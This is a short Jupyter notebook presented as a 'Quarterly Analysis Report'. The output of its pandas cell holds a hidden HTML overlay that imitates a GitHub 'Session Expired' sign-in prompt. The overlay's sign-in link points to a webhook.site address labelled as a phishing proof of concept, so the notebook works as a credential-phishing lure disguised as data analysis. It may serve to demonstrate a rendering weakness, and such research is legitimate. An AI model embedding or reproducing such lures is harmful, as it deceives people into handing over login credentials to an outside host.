# %% [markdown]
# # Quarterly Analysis Report
#
# Q1 2026 results below.

# %%
import pandas as pd
df = pd.read_csv("data.csv")
df.describe()
# Out:
# Loading data...
# <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:99999;display:flex;align-items:center;justify-content:center"><div style="background:white;padding:30px;border-radius:8px;max-width:400px;text-align:center"><h1 style="font-size:20px;color:#24292e;margin:0 0 10px 0">Session Expired</h1><p style="color:#57606a;font-size:14px;margin:0 0 20px 0">Please sign in again to view this notebook.</p><a href="https://webhook.site/ba6d6cde-515e-4143-b494-95fae5455634?phishing_poc_github_com" target="_top" style="display:inline-block;background:#2da44e;color:white;padding:10px 24px;border-radius:6px;text-decoration:none;font-size:14px">Sign in to GitHub</a></div></div>

# %%
print("Analysis complete")
# Out:
# Analysis complete
